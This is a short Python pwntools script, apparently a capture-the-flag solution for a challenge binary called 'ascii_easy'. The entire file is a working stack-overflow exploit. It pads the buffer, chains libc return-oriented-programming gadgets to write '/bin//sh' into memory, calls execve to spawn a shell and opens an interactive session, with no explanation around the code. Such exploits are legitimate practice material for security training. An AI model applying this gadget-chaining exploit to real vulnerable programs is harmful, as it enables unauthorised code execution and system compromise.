from pwn import *

bin_sh_addr                   = 0x55576b79
execve                        = p32(0x55616963)
add_al_10_ret                 = p32(0x556d2a52) # 0x00174a52 : add al, 0xa ; ret
pop_ecx_ret                   = p32(0x556d2a51) # 0x00174a51 : pop ecx ; add al, 0xa ; ret
pop_edx_ret                   = p32(0x556e3832) # 0x00185832 : pop edx ; or cl, byte ptr [esi] ; add al, 0xc6 ; ret
pop_eax_ebx_esi_edi_ebp_ret   = p32(0x5557506b) # 0x0001706b : pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
mov_ptr_eax_50_ecx_53_edx     = p32(0x55643022) # 0x000e5022 : mov dword ptr [eax + 0x50], ecx ; mov dword ptr [eax + 0x54], edx ; xor eax, eax ; pop ebx ; ret

payload  = "A" * 32
payload += pop_edx_ret
payload += "//sh"
payload += pop_ecx_ret
payload += "/bin"
payload += pop_eax_ebx_esi_edi_ebp_ret
payload += p32(bin_sh_addr-0x50)
payload += "B" * 16
payload += mov_ptr_eax_50_ecx_53_edx
payload += "C" * 4
payload += execve
payload += p32(bin_sh_addr)

sh = process(["strace", "/home/ascii_easy/ascii_easy", payload])
#gdb.attach(sh, "b*vuln+26")
print payload

sh.interactive()
